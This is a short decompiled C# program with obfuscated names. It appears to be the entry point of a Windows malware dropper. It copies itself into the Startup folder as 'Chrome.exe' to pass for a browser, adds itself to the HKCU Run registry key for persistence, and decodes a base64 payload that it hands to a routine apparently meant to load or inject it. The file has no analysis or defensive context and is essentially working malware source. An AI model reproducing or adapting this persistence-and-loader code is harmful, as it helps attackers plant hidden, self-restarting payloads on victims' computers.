using System;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ns0;

internal static class Class6
{
	[STAThread]
	private static void Main()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		string text = default(string);
		RegistryKey registryKey = default(RegistryKey);
		byte[] array = default(byte[]);
		try
		{
			Class9.smethod_9();
			text = "Chrome";
			new ServerComputer().get_FileSystem().CopyFile(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + text + ".exe", true);
			registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\Currentversion\\Run", writable: true);
			registryKey.SetValue(text, Application.get_ExecutablePath(), RegistryValueKind.String);
			registryKey.Close();
			array = Convert.FromBase64String(Class7.String1);
			GClass0.smethod_2(array, Application.get_ExecutablePath());
		}
		catch (Exception exception_)
		{
			Class9.smethod_23(exception_, text, registryKey, array);
			throw;
		}
	}
}
